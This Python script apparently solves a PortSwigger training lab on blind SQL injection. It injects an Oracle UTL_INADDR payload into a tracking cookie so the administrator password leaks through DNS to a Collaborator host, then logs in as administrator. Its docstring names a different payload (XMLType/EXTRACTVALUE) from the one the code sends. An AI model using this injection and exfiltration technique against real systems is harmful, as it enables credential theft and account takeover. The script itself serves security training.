#!/usr/bin/env python3
"""
Blind SQL injection with out-of-band data exfiltration
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 17-blind-out-of-band-data-exfiltration.md

What this does -- and what it honestly cannot do:
    This lab's TrackingId query is fully asynchronous: there is no boolean,
    error, or timing signal in the HTTP response, so the extracted password
    can only be read from a DNS/HTTP interaction log -- which means reading
    the result requires an actual Burp Suite Professional Collaborator
    client. No third-party OAST provider works here (the lab's egress only
    allows *.oastify.com / *.burpcollaborator.net), and Burp Community
    Edition's own Collaborator API returns null. There is no way around this
    with a plain Python HTTP client.

    So this script automates exactly the two parts that ARE scriptable, and
    tells you exactly what to do for the one part that isn't:

      1. SEND (this script, "send" mode): builds the Oracle XMLType/
         EXTRACTVALUE payload with your Collaborator subdomain concatenated
         to the administrator password, and fires it at the TrackingId
         cookie.
      2. READ (manual, Burp Suite Professional): open Burp's Collaborator
         tab, generate a payload/subdomain *before* step 1, click "Poll now"
         after step 1 -- the password appears as the leftmost label of the
         inbound Host header.
      3. LOGIN (this script, "login" mode): once you have the password from
         step 2, run this script again to complete the login. The lab
         tracker only flips to solved on a real authenticated browser
         session, so this step opens one with Playwright rather than logging
         in over plain HTTP -- if Playwright isn't installed, it prints the
         password and the manual login steps instead.

Usage:
    # Step 1 -- generate a Collaborator payload in Burp Pro first, then:
    python 17-blind-out-of-band-data-exfiltration.py send <lab-url> <your-collaborator-subdomain>

    # Step 2 -- check Burp's Collaborator tab ("Poll now") for the interaction,
    # read the password off the leftmost label of the Host header.

    # Step 3:
    python 17-blind-out-of-band-data-exfiltration.py login <lab-url> <password>

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium   # optional, for step 3
"""

import re
import sys
import httpx


def send(lab_url: str, collab_domain: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    seed = client.get(lab_url)
    tracking_id = seed.cookies.get("TrackingId", "x")
    session = seed.cookies.get("session", "")

    payload = (
        "'||(SELECT UTL_INADDR.get_host_address("
        "(SELECT password FROM users WHERE username='administrator')"
        f"||'.{collab_domain}') FROM dual)||'"
    )
    cookie = f"TrackingId={tracking_id}{payload}; session={session}"
    r = client.get(lab_url, headers={"Cookie": cookie})
    print(f"[*] Exfiltration request sent -- status={r.status_code}")
    print(f"[*] Now go to Burp Suite Professional's Collaborator tab and click 'Poll now'.")
    print(f"[*] The password will be the leftmost label of the inbound Host header,")
    print(f"    e.g. Host: <password>.{collab_domain}")
    print(f"[*] Then run: python {sys.argv[0]} login {lab_url} <password>")


def login(lab_url: str, password: str) -> None:
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("[!] Playwright not installed -- this lab's tracker only flips to solved on a")
        print("    real browser session, not a plain HTTP login. Install it with:")
        print("    pip install playwright && playwright install chromium")
        print(f"    Or log in manually at {lab_url}/login with administrator / {password}")
        return

    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        page.goto(f"{lab_url}/login")
        page.fill("input[name=username]", "administrator")
        page.fill("input[name=password]", password)
        page.click("button[type=submit]")
        page.wait_for_load_state("networkidle")

        check = page.goto(lab_url)
        html = check.text() if check else ""
        if "Congratulations" in html:
            print("[+] Logged in as administrator via browser. Lab solved.")
        else:
            print("[-] Login did not complete the solve condition -- double-check the password.")
        browser.close()


def solve(mode: str, lab_url: str, arg: str) -> None:
    if mode == "send":
        send(lab_url, arg)
    elif mode == "login":
        login(lab_url, arg)
    else:
        raise ValueError("mode must be 'send' or 'login'")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage:")
        print(f"  python {sys.argv[0]} send <lab-url> <your-collaborator-subdomain>")
        print(f"  python {sys.argv[0]} login <lab-url> <password>")
        sys.exit(1)
    solve(sys.argv[1], sys.argv[2].rstrip("/"), sys.argv[3])
